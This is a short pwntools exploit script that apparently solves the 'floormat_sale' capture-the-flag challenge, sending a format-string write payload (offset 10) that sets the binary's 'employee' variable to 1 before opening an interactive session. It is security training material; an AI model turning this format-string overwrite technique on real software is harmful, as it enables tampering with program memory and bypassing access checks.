#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'floormatsale.ctf.intigriti.io', 1339 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
'''
 ---------------------------------
| Symphonie der Entschlossenheit  |
 ---------------------------------
'''

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(elf)
    
    # format = elf.sym['employee']
    offset = 10
    payload = fmtstr_payload(offset, {elf.sym['employee']: 0x1})
    io.sendline(b'6')
    io.sendline(payload)
    

    io.interactive()
    
if __name__ == '__main__':
    exploit()